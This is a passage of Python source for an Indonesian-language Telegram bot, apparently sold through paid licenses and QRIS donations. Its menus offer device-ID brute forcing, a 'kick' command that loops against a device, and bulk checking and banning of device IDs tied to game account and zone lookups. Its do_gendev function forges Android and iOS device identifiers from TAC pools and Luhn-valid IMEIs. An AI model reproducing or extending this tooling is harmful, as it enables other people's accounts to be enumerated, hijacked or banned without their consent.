            tg_answer_cb(cb_id); tg_edit(cid, mid, "📦 <b>Bulk</b>", kb_bulk())
        elif data == "sub_other":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); tg_edit(cid, mid, "⚙️ <b>Lainnya</b>", kb_other())
        elif data == "sub_bf":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); tg_edit(cid, mid, "💥 <b>Brute Force</b>", kb_bf())
        elif data == "sub_manage":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); tg_edit(cid, mid, "👑 <b>Manage</b>", kb_manage())
        elif data == "sub_system":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); tg_edit(cid, mid, "🔧 <b>System</b>", kb_system())
        elif data == "sub_license":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            if not lics:
                tg_edit(cid, mid, "❌ License OFF", kb_system()); return
            st = lics.stats()
            tg_edit(cid, mid,
                    f"🔑 <b>License Manager</b>\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"📦 Total    : <b>{st['total']}</b>\n"
                    f"✅ Aktif    : <b>{st['active']}</b>\n"
                    f"⌛ Expired  : <b>{st['expired']}</b>\n"
                    f"⛔ Disabled : <b>{st['disabled']}</b>\n"
                    f"🔴 Habis    : <b>{st['exhausted']}</b>", kb_license())
        elif data == "menu_status":
            tg_answer_cb(cb_id); tg_edit(cid, mid, menu_status(cid), kb_back())
        elif data == "menu_myid":
            tg_answer_cb(cb_id); tg_edit(cid, mid, menu_myid(cid, username), kb_back())
        elif data == "menu_help":
            tg_answer_cb(cb_id); tg_edit(cid, mid, menu_help(cid), kb_back())
        elif data == "menu_stats":
            tg_answer_cb(cb_id); tg_edit(cid, mid, menu_stats(), kb_back())
        elif data == "menu_log":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            threading.Thread(target=do_show_log, args=(cid, 30), daemon=True).start()
        elif data == "my_notif":
            tg_answer_cb(cb_id)
            cur = NOTIF_STORE.get(cid) if NOTIF_STORE else True
            status = "🔔 ON" if cur else "🔕 OFF"
            kb = [[{"text":"🔔 ON","callback_data":"notif_on"},
                   {"text":"🔕 OFF","callback_data":"notif_off"}],
                  [{"text":"« Kembali","callback_data":"menu_main"}]]
            tg_edit(cid, mid, f"🔔 <b>Notifikasi</b>\n\nStatus: <b>{status}</b>", kb)
        elif data == "notif_on":
            if NOTIF_STORE: NOTIF_STORE.set(cid, True)
            tg_answer_cb(cb_id, "🔔 ON")
            tg_edit(cid, mid, "🔔 <b>Notifikasi: ON</b>", kb_back())
        elif data == "notif_off":
            if NOTIF_STORE: NOTIF_STORE.set(cid, False)
            tg_answer_cb(cb_id, "🔕 OFF")
            tg_edit(cid, mid, "🔕 <b>Notifikasi: OFF</b>", kb_back())
        elif data == "my_license":
            tg_answer_cb(cb_id)
            if not lics:
                tg_edit(cid, mid, "❌ License OFF", kb_back()); return
            my = lics.find_user_license(cid)
            if not my:
                tg_edit(cid, mid,
                        "🔑 <b>License Kamu</b>\n\n❌ Belum punya license\n\n"
                        "Kirim: <code>/redeem KODE</code>", kb_back())
            else:
                exp = "♾ PERMANEN"
                if my.get("expires_at"):
                    exp = datetime.fromtimestamp(my["expires_at"], TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
                tg_edit(cid, mid,
                        f"🔐 <b>License Kamu</b>\n"
                        f"━━━━━━━━━━━━━━━\n"
                        f"🔑 <code>{my['key']}</code>\n"
                        f"🎭 {my['role'].upper()}\n"
                        f"📅 {exp}", kb_back())

        elif data == "don_menu":
            tg_answer_cb(cb_id)
            if not dn:
                tg_edit(cid, mid, "❌ Donate OFF", kb_back()); return
            kb = dn.kb_donate(QRIS_CFG)
            tg_edit(cid, mid, dn.format_donate_menu(QRIS_CFG), kb)

        elif data.startswith("don_"):
            tg_answer_cb(cb_id)
            if not dn: return

            if data == "don_custom":
                set_pending(cid, "don_custom")
                tg_edit(cid, mid, "✏️ Kirim nominal donasi\nContoh: <code>15000</code>",
                        dn.kb_donate_back())
                return

            if data == "don_manual":
                tg_edit(cid, mid, dn.format_donate_manual(QRIS_CFG),
                        dn.kb_donate_back())
                return

            if data == "don_cancel":
                active = dn.get_active_qris(cid)
                if not active:
                    tg_answer_cb(cb_id, "❌ Tidak ada QRIS aktif", True)
                    return
                amount = active["amount"]
                msg_id = active["message_id"]
                dn.clear_qris(cid)
                tg_edit(cid, msg_id, dn.format_donate_cancelled(amount),
                        dn.kb_qris_cancelled())
                tg_answer_cb(cb_id, "❌ Donasi dibatalkan")
                log_forensic({"type": "donation_cancelled", "user": cid,
                              "username": username, "amount": amount})
                return

            if data == "don_paid":
                active = dn.get_active_qris(cid)
                if not active:
                    tg_answer_cb(cb_id, "❌ Tidak ada QRIS aktif", True)
                    return
                if active["message_id"] != mid:
                    tg_answer_cb(cb_id, "⚠️ Ini QRIS lama. Scan QRIS terbaru.", True)
                    return
                amount = active["amount"]
                msg_id = active["message_id"]
                dn.clear_qris(cid)

                need_approval = dn.should_require_approval(QRIS_CFG, amount)

                if need_approval:
                    dn.register_pending(cid, username, amount, msg_id)
                    if DONATION_TRACKER:
                        DONATION_TRACKER.add(cid, username, amount, "qris_pending")
                    tg_send(OWNER_CHAT_ID,
                            dn.format_pending_notif(cid, username, amount),
                            dn.kb_pending_approval(cid))
                    tg_edit(cid, msg_id,
                            dn.format_waiting_approval(amount),
                            [[{"text": "« Menu Utama", "callback_data": "menu_main"}]])
                    tg_answer_cb(cb_id, "⏳ Menunggu konfirmasi owner")
                    log_forensic({"type": "donation_pending", "user": cid,
                                  "username": username, "amount": amount})
                    return
                else:
                    license_key = None
                    reward = dn.get_reward(amount)
                    if reward and lics:
                        try:
                            r = lics.create_license(
                                role=reward["role"],
                                duration_hours=reward["hours"],
                                max_uses=1,
                                created_by=f"donate:{amount}",
                                note=f"Auto from donation Rp {amount:,}"
                            )
                            license_key = r["key"]
                            ok_r, msg_r, role_r, exp_r = lics.redeem_license(license_key, cid)
                            if ok_r:
                                exp_ts = exp_r if exp_r else None
                                with _USER_ACCESS_LOCK:
                                    _USER_ACCESS[str(cid)] = {
                                        "role": role_r,
                                        "granted": time.time(),
                                        "granted_by": f"donate:{amount}",
                                        "expires": exp_ts,
                                    }
                                save_access()
                                if DONATION_TRACKER:
                                    DONATION_TRACKER.set_license(cid, license_key)
                                log_forensic({"type": "auto_license", "user": cid,
                                              "username": username, "amount": amount,
                                              "license": license_key, "role": role_r})
                        except Exception as e:
                            safe_print(f"[AUTO-LIC ERR] {e}")

                    tg_send(OWNER_CHAT_ID,
                            dn.format_donate_owner_notif(cid, username, amount, "qris",
                                                          license_key, reward))
                    tg_edit(cid, msg_id,
                            dn.format_donate_paid(amount, cid, license_key, reward),
                            dn.kb_qris_cancelled())
                    tg_answer_cb(cb_id, "✅ License otomatis aktif!" if license_key else "✅ Konfirmasi terkirim")
                    log_forensic({"type": "donation_paid", "user": cid,
                                  "username": username, "amount": amount})
                    return

            try:
                amount = int(data.replace("don_", ""))
            except:
                return

            static_qris = QRIS_CFG.get("qris_static", "")
            if static_qris:
                dynamic = dn.make_dynamic_qris(static_qris, amount)
                if DONATION_TRACKER:
                    DONATION_TRACKER.add(cid, username, amount, "qris")
                try:
                    img_bytes = dn.qris_to_image_bytes(dynamic, 400)
                    if img_bytes:
                        files = {"photo": ("qris.png", img_bytes, "image/png")}
                        r = requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                            files=files,
                            data={"chat_id": cid,
                                  "caption": dn.format_donate_qris(QRIS_CFG, amount, cid),
                                  "parse_mode": "HTML",
                                  "reply_markup": json.dumps({
                                      "inline_keyboard": dn.kb_qris_active(cid)
                                  })},
                            timeout=30)
                        try:
                            resp = r.json()
                            if resp.get("ok"):
                                mid_qr = resp["result"]["message_id"]
                                dn.register_qris(cid, mid_qr, amount)
                                threading.Thread(
                                    target=_auto_expire_qris,
                                    args=(cid, mid_qr, amount),
                                    daemon=True
                                ).start()
                        except: pass
                    else:
                        r = tg_api("sendMessage",
                                   chat_id=cid,
                                   text=dn.format_donate_qris(QRIS_CFG, amount, cid),
                                   parse_mode="HTML",
                                   reply_markup={"inline_keyboard": dn.kb_qris_active(cid)})
                        try:
                            if r.get("ok"):
                                mid_qr = r["result"]["message_id"]
                                dn.register_qris(cid, mid_qr, amount)
                                threading.Thread(
                                    target=_auto_expire_qris,
                                    args=(cid, mid_qr, amount),
                                    daemon=True
                                ).start()
                        except: pass
                except Exception as e:
                    safe_print(f"[DONATE ERR] {e}")
                    tg_send(cid, dn.format_donate_qris(QRIS_CFG, amount, cid))
                tg_send(OWNER_CHAT_ID, dn.format_donate_owner_notif(cid, username, amount, "qris"))
            else:
                tg_send(cid, "⚠️ QRIS belum diset. Hubungi owner.")

        elif data.startswith("don_appr_"):
            if not is_owner:
                tg_answer_cb(cb_id, "🚫 Owner only", True); return
            target_cid = data.replace("don_appr_", "")
            tg_answer_cb(cb_id, "⏳ Processing...")

            p = dn.get_pending(target_cid)
            if not p:
                tg_answer_cb(cb_id, "❌ Pending tidak ditemukan", True)
                return

            amount = p["amount"]
            target_username = p["username"]
            reward = dn.get_reward(amount)

            if reward and lics:
                try:
                    r = lics.create_license(
                        role=reward["role"],
                        duration_hours=reward["hours"],
                        max_uses=1,
                        created_by=f"donate:{amount}",
                        note="Approved by owner"
                    )
                    license_key = r["key"]
                    ok_r, msg_r, role_r, exp_r = lics.redeem_license(license_key, target_cid)
                    if ok_r:
                        exp_ts = exp_r if exp_r else None
                        with _USER_ACCESS_LOCK:
                            _USER_ACCESS[target_cid] = {
                                "role": role_r,
                                "granted": time.time(),
                                "granted_by": f"donate:{amount}",
                                "expires": exp_ts,
                            }
                        save_access()
                        if DONATION_TRACKER:
                            DONATION_TRACKER.set_license(target_cid, license_key)

                        tg_send(target_cid,
                                dn.format_approved(amount, reward, license_key))

                        dn.clear_pending(target_cid)

                        tg_edit(cid, mid,
                                dn.format_approved_owner(target_cid, target_username,
                                                          amount, reward, license_key),
                                [[{"text": "« Menu Utama", "callback_data": "menu_main"}]])
                        log_forensic({"type": "donation_approved", "user": cid,
                                      "target": target_cid, "amount": amount,
                                      "license": license_key})
                except Exception as e:
                    safe_print(f"[APPROVE ERR] {e}")
                    tg_answer_cb(cb_id, f"❌ Error: {e}", True)

        elif data.startswith("don_rej_"):
            if not is_owner:
                tg_answer_cb(cb_id, "🚫 Owner only", True); return
            target_cid = data.replace("don_rej_", "")
            tg_answer_cb(cb_id, "⏳ Processing...")

            p = dn.get_pending(target_cid)
            if not p:
                tg_answer_cb(cb_id, "❌ Pending tidak ditemukan", True)
                return

            amount = p["amount"]
            target_username = p["username"]

            tg_send(target_cid, dn.format_rejected(amount))
            dn.clear_pending(target_cid)

            tg_edit(cid, mid,
                    dn.format_rejected_owner(target_cid, target_username, amount),
                    [[{"text": "« Menu Utama", "callback_data": "menu_main"}]])
            log_forensic({"type": "donation_rejected", "user": cid,
                          "target": target_cid, "amount": amount})

        elif data.startswith("don_info_"):
            if not is_owner:
                tg_answer_cb(cb_id, "🚫 Owner only", True); return
            target_cid = data.replace("don_info_", "")
            p = dn.get_pending(target_cid)
            if not p:
                tg_answer_cb(cb_id, "❌ Pending tidak ditemukan", True)
                return

            amount = p["amount"]
            target_username = p["username"]
            reward = dn.get_reward(amount)
            reward_text = ""
            if reward:
                durasi = "♾ PERMANEN" if reward["days"] is None else reward["label"]
                reward_text = (f"\n🎭 {reward['role'].upper()}\n"
                               f"📅 {durasi}")

            tg_answer_cb(cb_id)
            tg_send(cid,
                    f"👤 <b>User Info</b>\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"🆔 <code>{target_cid}</code>\n"
                    f"📛 {target_username}\n"
                    f"💵 Rp {amount:,}{reward_text}\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"Role saat ini: <b>{get_role(target_cid) or 'user'}</b>")

        elif data == "cb_lookup":
            ok, used, mx = check_limit(cid, "lookup")
            if not ok and not is_admin:
                tg_answer_cb(cb_id, f"❌ Limit ({used}/{mx})", True); return
            tg_answer_cb(cb_id, "Kirim /lookup ID")
            tg_edit(cid, mid,
                    f"🎯 <b>Lookup</b>\n\n<code>/lookup ROLE_ID [ZONE]</code>\n\n"
                    f"📊 {used}/{mx}", kb_tools())
        elif data == "cb_valid":
            ok, used, mx = check_limit(cid, "valid")
            if not ok and not is_admin:
                tg_answer_cb(cb_id, f"❌ Limit ({used}/{mx})", True); return
            tg_answer_cb(cb_id)
            tg_edit(cid, mid, f"✅ <b>Cek Valid</b>\n📊 {used}/{mx}", kb_valid())
        elif data == "valid_manual":
            tg_answer_cb(cb_id); set_pending(cid, "valid_manual")
            tg_edit(cid, mid, "✏️ Kirim Device ID (1/baris)\n\n/cancel batal",
                    kb_back("cb_valid"))
        elif data == "valid_file":
            tg_answer_cb(cb_id); set_pending(cid, "valid_file")
            tg_edit(cid, mid, "📁 Upload file .txt\n\n/cancel batal",
                    kb_back("cb_valid"))
        elif data == "cb_ban":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id)
            tg_edit(cid, mid, "🚫 <code>/ban DEVICE</code>", kb_tools())
        elif data == "cb_pipeline":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "pipeline")
            tg_edit(cid, mid, "🎬 Upload file .txt device ID", kb_back("sub_tools"))
        elif data in ("bulk_lookup", "bulk_detail", "bulk_ban", "bulk_valid"):
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            ok, used, mx = check_limit(cid, "bulk")
            if not ok:
                tg_answer_cb(cb_id, f"❌ Bulk limit ({used}/{mx})", True); return
            tg_answer_cb(cb_id); set_pending(cid, data)
            labels = {
                "bulk_lookup": "🎯 Upload file .txt (Role ID)",
                "bulk_detail": "📱 Upload file .txt (Device ID)",
                "bulk_ban": "🚫 Upload file .txt",
                "bulk_valid": "✅ Upload file .txt",
            }
            tg_edit(cid, mid, labels[data], kb_bulk())
        elif data == "stop_job":
            stopped = job_stop(cid) or stop_job(cid)
            if stopped: tg_answer_cb(cb_id, "⛔ Stopping", True)
            else: tg_answer_cb(cb_id, "❌ No active job", True)
        elif data == "menu_gendev":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id)
            tg_edit(cid, mid,
                    "🔧 <code>/gendev [N] [and|ios|mixed]</code>",
                    [[{"text":"🔧 10 mixed","callback_data":"gen_10_mixed"},
                      {"text":"🔧 50 and","callback_data":"gen_50_and"}],
                     [{"text":"🔧 50 ios","callback_data":"gen_50_ios"}],
                     [{"text":"« Kembali","callback_data":"sub_other"}]])
        elif data.startswith("gen_"):
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id, "🔧 Processing...")
            try:
                parts = data.split("_"); n = int(parts[1]); typ = parts[2]
            except: return
            threading.Thread(target=do_gendev, args=(cid, n, typ), daemon=True).start()
        elif data == "cb_export_csv":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id, "📤 Exporting...")
            threading.Thread(target=do_export_csv, args=(cid,), daemon=True).start()
        elif data == "cb_export_json":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id, "📤 Exporting...")
            threading.Thread(target=do_export_json, args=(cid,), daemon=True).start()
        elif data == "cb_zip":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id, "🗜 Zipping...")
            threading.Thread(target=do_zip, args=(cid,), daemon=True).start()
        elif data == "cb_split":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "split")
            tg_edit(cid, mid, "✂️ Kirim jumlah per file (contoh: 50)", kb_back("sub_other"))
        elif data == "cb_filter":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "filter")
            tg_edit(cid, mid,
                    "🔍 Format: <code>device&gt;=xxx</code>\n<code>account=123</code>",
                    kb_back("sub_other"))
        elif data == "cb_dedup":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "dedup")
            tg_edit(cid, mid, "🗑 Upload file untuk dedup", kb_back("sub_other"))
        elif data == "cb_merge":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "merge", {})
            tg_edit(cid, mid, "🔗 Upload file ke-1", kb_back("sub_other"))
        elif data == "bf_gen":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "bf_gen")
            tg_edit(cid, mid, f"🔨 <code>N type</code>\nMax: {BF_GEN_MAX}", kb_back("sub_bf"))
        elif data == "bf_kick":
            if not is_admin: tg_answer_cb(cb_id, "Admin only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "bf_kick")
            tg_edit(cid, mid, "💥 <code>DEVICE [loops] [delay]</code>", kb_back("sub_bf"))
        elif data == "mg_adduser":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_adduser")
            tg_edit(cid, mid, "➕ Kirim <code>@user</code> atau ID", kb_back("sub_manage"))
        elif data == "mg_deluser":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_deluser")
            tg_edit(cid, mid, "➖ Kirim <code>@user</code> atau ID", kb_back("sub_manage"))
        elif data == "mg_addadmin":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_addadmin")
            tg_edit(cid, mid, "➕ Kirim <code>@user</code> atau ID", kb_back("sub_manage"))
        elif data == "mg_listusers":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            users = list(_USER_ACCESS.keys())
            txt = f"👥 <b>Users ({len(users)})</b>\n\n"
            for u in users[:40]:
                txt += f"• <code>{u}</code> — {_USER_ACCESS[u].get('role','user')}\n"
            tg_edit(cid, mid, txt or "Kosong", kb_back("sub_manage"))
        elif data == "mg_userinfo":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_userinfo")
            tg_edit(cid, mid, "👤 Kirim <code>@user</code> atau ID", kb_back("sub_manage"))
        elif data == "mg_setrole":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_setrole")
            tg_edit(cid, mid,
                    "🎭 Kirim: <code>@user ROLE</code>\n"
                    "Role: owner|admin|user|trial|guest",
                    kb_back("sub_manage"))
        elif data == "mg_setlimit":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_setlimit")
            tg_edit(cid, mid, "⚙️ Kirim: <code>@user N</code>", kb_back("sub_manage"))
        elif data == "mg_resetlimit":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_resetlimit")
            tg_edit(cid, mid, "🔄 Kirim <code>@user</code>", kb_back("sub_manage"))
        elif data == "mg_block":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_block")
            tg_edit(cid, mid, "🚫 Kirim <code>@user</code> atau ID", kb_back("sub_manage"))
        elif data == "mg_unblock":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "mg_unblock")
            tg_edit(cid, mid, "✅ Kirim Chat ID", kb_back("sub_manage"))
        elif data == "sy_broadcast":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "sy_broadcast")
            tg_edit(cid, mid, "📢 Kirim pesan broadcast", kb_back("sub_system"))
        elif data == "sy_debug":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            tg_edit(cid, mid,
                    f"🧪 <b>Debug</b>\n\n"
                    f"OS: {platform.system()}\n"
                    f"Python: {platform.python_version()}\n"
                    f"Uptime: {int(time.time()-_BOT_START_TIME)}s\n"
                    f"Mode: <b>{PERFORMANCE_MODE.upper()}</b>\n"
                    f"Users: {len(_USER_ACCESS)}\n"
                    f"Blocked: {len(_BLOCKED_USERS)}", kb_back("sub_system"))
        elif data == "sy_backup":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id, "💾 Backing...")
            threading.Thread(target=do_backup, args=(cid,), daemon=True).start()
        elif data == "sy_cleanup":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id, "🗑 Cleanup...")
            threading.Thread(target=do_cleanup, args=(cid,), daemon=True).start()
        elif data == "sy_setmode":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "sy_setmode")
            tg_edit(cid, mid, "⚡ Kirim: aggressive/balanced/safe", kb_back("sub_system"))
        elif data == "lic_create":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "lic_create", {})
            tg_edit(cid, mid, "🔑 <b>Buat License</b>\n\nPilih role:", kb_lic_role())
        elif data.startswith("lic_role_"):
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            role_sel = data.replace("lic_role_", "")
            p = get_pending(cid) or {"data": {}}
            d = p.get("data", {}); d["role"] = role_sel
            set_pending(cid, "lic_create", d)
            tg_edit(cid, mid, f"🔑 Role: <b>{role_sel.upper()}</b>\n\nPilih durasi:", kb_lic_duration())
        elif data.startswith("lic_dur_"):
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            dur = data.replace("lic_dur_", "")
            p = get_pending(cid) or {"data": {}}
            d = p.get("data", {})
            if "role" not in d:
                tg_answer_cb(cb_id, "❌ Mulai ulang", True); return
            d["duration"] = dur
            set_pending(cid, "lic_create", d)
            tg_edit(cid, mid,
                    f"🔑 Role: <b>{d['role'].upper()}</b>\n"
                    f"⏱ Durasi: <b>{dur}</b>\n\nPilih max uses:", kb_lic_uses())
        elif data.startswith("lic_use_"):
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            if not lics: tg_answer_cb(cb_id, "❌ OFF", True); return
            p = get_pending(cid) or {"data": {}}
            d = p.get("data", {})
            if "duration" not in d or "role" not in d:
                tg_answer_cb(cb_id, "❌ Mulai ulang", True); return
            try: max_uses = int(data.replace("lic_use_", ""))
            except: max_uses = 1
            role_sel = d["role"]; dur_key = d["duration"]
            dur_hours = lics.LICENSE_DURATIONS.get(dur_key, 24)
            r = lics.create_license(role=role_sel, duration_hours=dur_hours,
                                    max_uses=max_uses, created_by=str(cid))
            clear_pending(cid)
            tg_answer_cb(cb_id, "✅ License dibuat!")
            exp = "♾ PERMANEN"
            if r["expires_at"]:
                exp = datetime.fromtimestamp(r["expires_at"], TZ_WIB).strftime("%Y-%m-%d %H:%M WIB")
            tg_edit(cid, mid,
                    f"🔑 <b>LICENSE BARU</b>\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"🔐 <code>{r['key']}</code>\n"
                    f"🎭 Role   : <b>{r['role'].upper()}</b>\n"
                    f"📅 Expired: <b>{exp}</b>\n"
                    f"👥 Max    : <b>{r['max_uses']}</b>\n"
                    f"━━━━━━━━━━━━━━━\n\n"
                    f"Kirim ke user:\n<code>/redeem {r['key']}</code>", kb_license())
        elif data == "lic_cancel":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            clear_pending(cid)
            tg_answer_cb(cb_id, "❌ Dibatalkan")
            tg_edit(cid, mid, "🔑 <b>License Manager</b>", kb_license())
        elif data == "lic_list":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            items = lics.list_licenses() if lics else []
            if not items:
                tg_edit(cid, mid, "📭 Belum ada license", kb_license()); return
            now = time.time()
            txt = f"📋 <b>License ({len(items)})</b>\n\n"
            for lic in items[:25]:
                if not lic.get("enabled", True): st = "⛔"
                elif lic["expires_at"] and now > lic["expires_at"]: st = "⌛"
                elif lic["used_count"] >= lic["max_uses"]: st = "🔴"
                else: st = "✅"
                txt += (f"{st} <code>{lic['key']}</code>\n"
                        f"   {lic['role']} | {lic['used_count']}/{lic['max_uses']}\n")
            if len(items) > 25:
                txt += f"\n<i>... +{len(items)-25} lainnya</i>"
            tg_edit(cid, mid, txt, kb_license())
        elif data == "lic_stats":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id)
            st = lics.stats() if lics else {}
            tg_edit(cid, mid,
                    f"📊 <b>License Stats</b>\n\n"
                    f"📦 Total    : {st.get('total',0)}\n"
                    f"✅ Aktif    : {st.get('active',0)}\n"
                    f"⌛ Expired  : {st.get('expired',0)}\n"
                    f"⛔ Disabled : {st.get('disabled',0)}\n"
                    f"🔴 Habis    : {st.get('exhausted',0)}", kb_license())
        elif data == "lic_check":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "lic_check")
            tg_edit(cid, mid, "🔍 Kirim kode license", kb_license())
        elif data == "lic_delete":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "lic_delete")
            tg_edit(cid, mid, "🗑 Kirim kode license yang mau dihapus", kb_license())
        elif data == "lic_revoke":
            if not is_owner: tg_answer_cb(cb_id, "Owner only", True); return
            tg_answer_cb(cb_id); set_pending(cid, "lic_revoke")
            tg_edit(cid, mid, "⛔ Kirim kode license yang mau di-revoke", kb_license())
        else:
            tg_answer_cb(cb_id, "❓ Unknown")
    except Exception as e:
        safe_print(f"[CB ERROR] {e}")
        import traceback
        traceback.print_exc()
        try: tg_answer_cb(cb_id, f"❌ Error: {type(e).__name__}", True)
        except: pass

print("[BOOT] Bagian 9/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  THREAD TASKS
# ══════════════════════════════════════════════════════════════════
def do_gendev(cid, n, typ):
    tg_send(cid, f"🔧 Generating <b>{n}</b> {typ.upper()}...")
    gen, seen = [], set()

    if TAC_POOL_ALL:
        import hashlib as _h
        def _luhn(p):
            t = 0
            for i, d in enumerate(reversed([int(c) for c in p])):
                if i % 2 == 1:
                    d *= 2
                    if d > 9: d -= 9
                t += d
            return str((10 - (t % 10)) % 10)

        def _and():
            tac = secrets.choice(TAC_POOL_ANDROID)
            s = "".join(str(secrets.randbelow(10)) for _ in range(6))
            imei = tac + s + _luhn(tac + s)
            return f"and_{_h.md5(imei.encode()).hexdigest()}{_h.sha256(imei.encode()).hexdigest()[:16]}{uuid.uuid4()}"

        def _ios():
            tac = secrets.choice(TAC_POOL_IOS)
            s = "".join(str(secrets.randbelow(10)) for _ in range(6))
            f = tac + s + _luhn(tac + s)
            return f"ios_{_h.sha256(f.encode()).hexdigest()[:32].upper()}"

        for i in range(n):
            v = _and() if typ == "and" else _ios() if typ == "ios" else (_and() if i % 2 == 0 else _ios())
            if v not in seen:
                seen.add(v); gen.append(v)
    else:
        for i in range(n):
            v = f"and_{secrets.token_hex(28)}-{uuid.uuid4()}" if typ != "ios" else f"ios_{str(uuid.uuid4()).upper()}"
            if v not in seen:
                seen.add(v); gen.append(v)

    out = STORE_DIR / "generated.txt"
    out.write_text("\n".join(gen) + "\n", encoding="utf-8")
    tg_send(cid, f"✅ Generated {len(gen)} ({'TAC' if TAC_POOL_ALL else 'Random'})\n📁 {out.name}")
    tg_send_doc(cid, str(out), f"📁 {len(gen)} ID")

def do_export_csv(cid):
    lines = read_valid_lines()
    if not lines: tg_send(cid, "❌ Kosong"); return
    out = STORE_DIR / f"export_{int(time.time())}.csv"
    with open(out, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["No","Device ID","Account ID","Zone ID"])
        for i, line in enumerate(lines, 1):
            info = parse_valid_line(line) or {}
            w.writerow([i, info.get("device",""), info.get("account",""), info.get("zone","")])
    tg_send(cid, f"📤 CSV ({len(lines)})")
    tg_send_doc(cid, str(out), f"📁 {len(lines)} records")

def do_export_json(cid):
    lines = read_valid_lines()
    if not lines: tg_send(cid, "❌ Kosong"); return
    data = []
    for i, line in enumerate(lines, 1):
        info = parse_valid_line(line) or {}; info["no"] = i; data.append(info)
    out = STORE_DIR / f"export_{int(time.time())}.json"
    out.write_text(json.dumps(data, indent=2), encoding="utf-8")
    tg_send_doc(cid, str(out), f"📁 {len(data)} records")

def do_zip(cid):
    out = STORE_DIR / f"zip_{int(time.time())}.zip"
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in RESULTS_DIR.rglob("*.txt"):
            if f.is_file(): zf.write(f, f.relative_to(STORE_DIR))
    tg_send_doc(cid, str(out), "🗜 Semua TXT")

def do_backup(cid):
    try:
        bd = STORE_DIR / "backup"; bd.mkdir(exist_ok=True)
        zp = bd / f"backup_{int(time.time())}.zip"
        with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in STORE_DIR.rglob("*"):
                if f.is_file() and not f.name.startswith("backup_") and f.suffix != ".zip":
                    zf.write(f, f.relative_to(STORE_DIR))
        tg_send_doc(cid, str(zp), "💾 Backup complete")
